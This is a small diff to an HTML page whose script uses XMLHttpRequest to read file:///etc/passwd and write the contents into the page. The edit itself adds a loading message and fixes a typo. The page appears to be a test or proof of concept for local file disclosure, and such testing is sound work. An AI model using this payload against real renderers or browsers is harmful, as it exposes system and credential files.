@@ -4,10 +4,11 @@
 <div id="response"></div>
 
 <script>
+document.getElementById('response').innerHTML = "Loading...";
 var x = new XMLHttpRequest();
 x.open("GET", "file:///etc/passwd", false);
 x.send();
-document.getElementById('response').innerHTML = "Ressponse: "+ x.statusText + " \n\n" + x.responseText;
+document.getElementById('response').innerHTML = "Response: "+ x.statusText + " \n\n" + x.responseText;
   
 </script>
 </body>
